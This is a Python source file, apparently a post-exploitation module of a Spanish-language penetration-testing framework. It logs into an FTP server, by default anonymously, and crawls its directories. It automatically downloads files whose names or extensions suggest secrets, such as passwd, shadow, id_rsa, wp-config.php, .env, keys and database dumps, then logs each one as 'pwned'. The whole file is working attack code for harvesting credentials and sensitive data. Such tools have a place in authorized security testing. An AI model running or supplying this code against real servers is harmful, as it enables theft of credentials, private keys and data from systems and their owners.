# scripts/ftp/post/download_loot.py
import ftplib
import os
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

LOOT_EXTENSIONS = {
    ".conf", ".cfg", ".config", ".ini", ".env", ".sql", ".db",
    ".sqlite", ".dump", ".key", ".pem", ".crt", ".p12", ".pfx",
    ".bak", ".backup", ".tar", ".gz", ".zip", ".htpasswd", ".passwd",
    ".shadow", ".xml", ".json", ".yaml", ".yml",
}

LOOT_NAMES = {
    "passwd", "shadow", "config", "backup", "database", "dump",
    "id_rsa", "id_dsa", "authorized_keys", "wp-config.php",
    ".env", ".htpasswd", "credentials", "secret",
}

class Script(BaseScript):
    name        = "download-loot"
    protocol    = "ftp"
    category    = "post"
    description = "Post-explotación: descarga automática de ficheros sensibles del FTP (configs, backups, claves, dumps de BD)."

    def run(self, **kwargs):
        port      = int(kwargs.get("port") or 21)
        timeout   = int(kwargs.get("timeout") or self.target.timeout or 5)
        user      = kwargs.get("user") or self.creds.user or "anonymous"
        password  = kwargs.get("password") or self.creds.password or "anonymous@"
        max_depth = int(kwargs.get("max_depth") or 3)
        max_size  = int(kwargs.get("max_size") or 10 * 1024 * 1024)
        out_dir   = kwargs.get("out_dir") or f"loot_ftp_{self.target.ip}"
        ip        = self.target.ip

        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout)
            ftp.login(user, password)
        except Exception as e:
            print_result("FTP", ip, "fail", f"no se pudo autenticar: {e}")
            return None

        os.makedirs(out_dir, exist_ok=True)
        downloaded = []

        def _recurse(current_path, depth):
            if depth > max_depth: return
            try:
                entries = []
                ftp.cwd(current_path)
                ftp.retrlines("LIST", entries.append)
                for entry in entries:
                    parts = entry.split(None, 8)
                    if len(parts) < 9: continue
                    perms, size_str, fname = parts[0], parts[4], parts[8]
                    is_dir    = perms.startswith("d")
                    fname_low = fname.lower()
                    ext       = os.path.splitext(fname_low)[1]
                    fpath     = f"{current_path.rstrip('/')}/{fname}"
                    if is_dir and depth < max_depth:
                        try: _recurse(fpath, depth + 1)
                        except Exception: pass
                    elif (ext in LOOT_EXTENSIONS or any(kw in fname_low for kw in LOOT_NAMES)):
                        try: size = int(size_str)
                        except ValueError: size = 0
                        if size > max_size:
                            print_result("FTP", ip, "info", f"omitido (grande): {fpath}")
                            continue
                        local_name = fpath.replace("/", "_").lstrip("_")
                        local_path = os.path.join(out_dir, local_name)
                        try:
                            with open(local_path, "wb") as lf:
                                ftp.retrbinary(f"RETR {fpath}", lf.write)
                            downloaded.append((fpath, local_path, size))
                            print_result("FTP", ip, "pwned", f"descargado: {fpath}")
                            session_db.save_finding(ip, "FTP", "loot_downloaded", fpath)
                        except Exception as e:
                            print_result("FTP", ip, "info", f"no descargado {fpath}: {e}")
            except Exception: pass

        _recurse("/", 0)
        try: ftp.quit()
        except Exception: pass

        if downloaded:
            rows = [(rp, lp, f"{s//1024}KB") for rp, lp, s in downloaded]
            print_table(f"Loot descargado — {ip}:{port}",
                        ["Remoto", "Local", "Tamaño"], rows[:30])
            print_result("FTP", ip, "pwned",
                         f"download-loot: {len(downloaded)} fichero(s) en {out_dir}")
        else:
            print_check("Sin ficheros sensibles encontrados", ok=True)

        return {"downloaded": downloaded, "out_dir": out_dir}
